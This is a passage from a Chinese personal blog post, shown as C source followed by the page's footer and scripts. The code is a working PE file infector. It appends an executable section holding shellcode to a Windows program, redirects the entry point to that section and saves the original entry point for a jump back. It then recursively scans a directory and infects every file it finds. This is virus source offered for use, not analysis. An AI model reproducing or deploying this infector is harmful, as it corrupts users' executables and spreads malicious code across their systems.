	pNewHdr-&gt;Misc.VirtualSize = nSecSize;//这个值可以不是对齐的值 ps:貌似除了这个其他都要对齐哎╮(╯▽╰)╭
	pNewHdr-&gt;SizeOfRawData = Align(nSecSize, pNtHdr-&gt;OptionalHeader.FileAlignment);
	pNewHdr-&gt;Characteristics = IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE;
	pNtHdr-&gt;FileHeader.NumberOfSections++;
	pNtHdr-&gt;OptionalHeader.SizeOfImage += Align(pNewHdr-&gt;Misc.VirtualSize, pNtHdr-&gt;OptionalHeader.SectionAlignment);//这个值必须是对齐的值
	pNtHdr-&gt;OptionalHeader.SizeOfCode += Align(pNewHdr-&gt;SizeOfRawData, pNtHdr-&gt;OptionalHeader.FileAlignment);//话说这个好像可要可不要
	//FlushViewOfFile(pDosHdr, 0);


	//写入shellcode
	DWORD dwNum1 = 0;
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, pShell, nShellLen, &amp;dwNum1, NULL);
	SetFilePointer(hFile, -6, 0, FILE_CURRENT);
	DWORD dwOldOp = pNtHdr-&gt;OptionalHeader.AddressOfEntryPoint;
	//printf("原始入口点: %XH\n", dwOldOp);
	dwOldOp += pNtHdr-&gt;OptionalHeader.ImageBase;
	//printf("原始程序加载点: %XH\n", dwOldOp);
	WriteFile(hFile, &amp;dwOldOp, 4, &amp;dwNum1, NULL);


	//写入剩余字节
	PBYTE pByte = (PBYTE)malloc(pNewHdr-&gt;SizeOfRawData - nShellLen);
	ZeroMemory(pByte, pNewHdr-&gt;SizeOfRawData - nShellLen);
	DWORD dwNum = 0;
	SetFilePointer(hFile, 0, 0, FILE_END);
	WriteFile(hFile, pByte, pNewHdr-&gt;SizeOfRawData - nShellLen, &amp;dwNum, NULL);
	//FlushFileBuffers(hFile);
	free(pByte);


	pNtHdr-&gt;OptionalHeader.AddressOfEntryPoint = pNewHdr-&gt;VirtualAddress;
	//printf("新入口点: %X\n", pNewHdr-&gt;VirtualAddress);


Err:
	CloseHandle(hFile);
	UnmapViewOfFile(lpMemory);
}


//函数功能: 扫描查找文件
//参数说明:
//szPath:需要扫描的目录
void FindFile(char *szPath)
{
	WIN32_FIND_DATAA FindFileData;

	char szFileToFind[MAX_PATH] = { 0 };
	lstrcpyA(szFileToFind, szPath);
	lstrcatA(szFileToFind, "\\*.*");


	//查找目录下所有文件
	HANDLE hFile = FindFirstFileA(szFileToFind, &amp;FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("FindFirstFileA Failed!\n");
		return;
	}
	do
	{
		char szNewPath[MAX_PATH] = { 0 };
		lstrcpyA(szNewPath, szPath);


		//判断是否是目录
		if (FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
		{
			//判断是否是.或..
			if (!lstrcmpA(FindFileData.cFileName, ".") || !lstrcmpA(FindFileData.cFileName, "..")){}
			else
			{
				//递归查找下级目录
				lstrcatA(szNewPath, "\\");
				lstrcatA(szNewPath, FindFileData.cFileName);
				FindFile(szNewPath);
			}
		}
		else
		{
			//处理查找到的文件
			char szExe[MAX_PATH] = { 0 };
			lstrcpyA(szExe, szNewPath);
			lstrcatA(szExe, "\\");
			lstrcatA(szExe, FindFileData.cFileName);
			MessageBoxA(NULL, szExe, NULL, 0);
			FectPE(szExe);
		}
	} while (FindNextFileA(hFile, &amp;FindFileData));


	FindClose(hFile);
}



int _tmain(int argc, _TCHAR* argv[])
{
	FindFile(ItIs);
	return 0;
}

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="../../../../../../../about" rel="external nofollow noreferrer">fantasycat6</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://fantasycat6.github.io">https://fantasycat6.github.io</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="../../../../../../../about" target="_blank">fantasycat6</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="../../../../../../../libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="../../../../../../../libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="../../../../../../../medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="../../../../../../../medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="../bi-ji-1.23-da-zao-zi-ji-du-li-de-hong-lan-dui-kang-rat-hou-men-shell-yi/">
                    <div class="card-image">
                        
                        
                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
                        
                        <span class="card-title"></span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            fantasycat6
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="../bi-ji-1.20-iat-zi-shen-gao-ji-wan-fa-yi/">
                    <div class="card-image">
                        
                        
                        <img src="../../../../../../../medias/featureimages/0.jpg" class="responsive-img" alt="">
                        
                        <span class="card-title"></span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            fantasycat6
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Hexo<br />'
            + '文章作者: fantasycat6<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="../../../../../../../libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="../../../../../../../libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="../../../../../../../libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="7788095093"
                   fixed='true'
                   autoplay='true'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="../../../../../../../libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022-2023</span>
            
            <span id="year">2022</span>
            <a href="../../../../../../../about" target="_blank">fantasycat6</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">312.9k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/fantasycat6" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1745272762@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1745272762" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1745272762" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="../../../../../../../atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('../../../../../../../search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="../../../../../../../libs/materialize/materialize.min.js"></script>
    <script src="../../../../../../../libs/masonry/masonry.pkgd.min.js"></script>
    <script src="../../../../../../../libs/aos/aos.js"></script>
    <script src="../../../../../../../libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="../../../../../../../libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="../../../../../../../js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="../../../../../../../libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="../../../../../../../libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="../../../../../../../libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
